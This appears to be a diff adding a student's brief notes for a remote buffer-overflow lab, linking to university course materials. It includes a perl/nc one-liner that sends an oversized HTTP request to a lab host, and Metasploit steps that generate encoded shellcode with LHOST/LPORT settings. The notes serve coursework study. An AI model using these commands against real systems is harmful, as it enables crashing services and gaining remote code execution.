@@ -1,0 +1,21 @@
+perl -e "print 'GET /' . 'A'x2000 . ' HTTP/1.0'"|nc 192.168.10.130 4444
+
+
+
+/usr/share/metasploit-framework --> msfconsole
+	set LHOST
+	set LPORT
+	generate -e x86/alpha_mixed -s 900 -t c
+
+
+
+************* Connection reset by peer ????? question...
+
+http://people.cis.ksu.edu/~xou/cybersec/materials/remote_overflow.html
+http://people.cis.ksu.edu/~xou/cybersec/materials/videos/0910.mp4
+http://people.cis.ksu.edu/~xou/cybersec/materials/videos/0903.mp4
+
+
+
+/sbin/ifconfig
+ps -ax
